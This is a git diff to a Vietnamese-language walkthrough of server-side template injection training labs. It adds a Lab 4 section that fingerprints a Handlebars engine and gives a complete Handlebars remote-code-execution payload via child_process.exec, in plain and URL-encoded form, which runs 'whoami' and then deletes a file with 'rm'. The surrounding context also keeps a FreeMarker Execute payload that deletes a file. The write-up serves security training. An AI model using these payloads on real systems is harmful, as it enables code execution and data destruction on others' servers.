@@ -3,7 +3,8 @@
 * [Lab 1: Basic server-side template injection](#lab-1-basic-server-side-template-injection)
 * [Lab 2: Basic server-side template injection (code context)](#lab-2-basic-server-side-template-injection-code-context)
 * [Lab 3: Server-side template injection using documentation](#lab-3-server-side-template-injection-using-documentation)
-
+* [Lab 4: Server-side template injection in an unknown language with a documented exploit](#lab-4-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+* [Lab 5: Server-side template injection with information disclosure via user-supplied objects](#lab-5-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
 
 ## Lab 1: Basic server-side template injection
 
@@ -112,7 +113,7 @@ You can log in to your own account using the following credentials:
 content-manager:C0nt3ntM4n4g3r
 
 ```
-Bài này chứa SSTI ở phần **Edit template**, để ý khi edit template thì các giá trị được hiển thị thông qua ${}, thử truyền ${abcd} để xem có báo lỗi gì kh:
+Bài này chứa SSTI ở phần **Edit template**, để ý khi edit template thì các giá trị được hiển thị thông qua **${}**, thử truyền **${abcd}** để xem có báo lỗi gì kh:
 
 ![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_10.jpg)
 
@@ -146,3 +147,73 @@ ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()
 Hiển thị file morale.txt, đến đây thì xóa file morale.txt thôi: **${"freemarker.template.utility.Execute"?new()("rm morale.txt")**. Vậy là xong bài lab.
 
 ![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab3_03.jpg)
+
+## Lab 4: Server-side template injection in an unknown language with a documented exploit
+
+```
+This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
+
+```
+#### Bài lab này tương tự như bài 1, khi mà bấm vào view details ở post 1 thì trả về message "Unfortunately ...", thử test ssti đơn giản bằng **{{7*7}}** thì server trả về lỗi, ta xác định được tempalte đang được dùng là Handlebars.
+
+![]()
+
+Đến đây có thể dùng payloads của handerbars template sau để test: 
+
+```
+= Error
+-----
+${7*7} = ${7*7}
+-----
+Nothing
+-----
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+```
+Ở đây để truyền xóa được file morale.txt, vẫn như cái bài lab trước thay đoạn payload trên với 'whoami' -> 'rm /home/carlos/morale.txt':
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+```
+Sau đó chỉ cần url encode rồi truyền vào tham số message= trên thanh search là xong bài lab.
+
+> url encode: %7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
+
+## Lab 5: Server-side template injection with information disclosure via user-supplied objects
